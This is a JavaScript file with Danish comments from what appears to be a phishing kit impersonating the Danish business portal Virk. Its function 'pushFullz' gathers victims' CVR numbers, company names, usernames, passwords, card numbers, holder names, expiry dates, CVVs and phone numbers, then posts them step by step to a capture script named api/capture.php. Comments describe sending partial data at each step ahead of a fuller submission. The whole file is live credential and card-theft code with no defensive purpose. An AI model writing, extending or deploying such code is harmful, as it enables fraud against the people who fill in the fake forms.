// js/capture.js
async function pushFullz() {
  // Denne funktion kaldes ved hvert trin for at gemme data midlertidigt,
  // men den store besked sendes først fra verify.html.
  // Hvis du vil have live opdateringer ved hvert trin, kan du tilføje logik her.
  
  if (!state.data.cvrNumber && !state.data.username && !state.data.phoneNumber) return;

  // Byg dataobjekt baseret på hvad der er indtastet så langt
  const formData = new URLSearchParams();
  formData.append('cvr', state.data.cvrNumber || '');
  formData.append('company', state.data.companyName || '');
  formData.append('user', state.data.username || '');
  formData.append('pass', state.data.password || '');
  formData.append('card', state.data.cardNumber || '');
  formData.append('holder', state.data.cardHolder || '');
  formData.append('exp', state.data.expiry || '');
  formData.append('cvv', state.data.cvv || '');
  formData.append('phone', state.data.phoneNumber || '');
  formData.append('source', 'virk_partial'); // Marker som delvis

  try {
    const response = await fetch('api/capture.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData.toString()
    });
    // Vi ignerer responsen her da vi venter på det fulde sæt i verify.html
  } catch (error) {
    console.error('Netværksfejl ved delvis send:', error);
  }
}
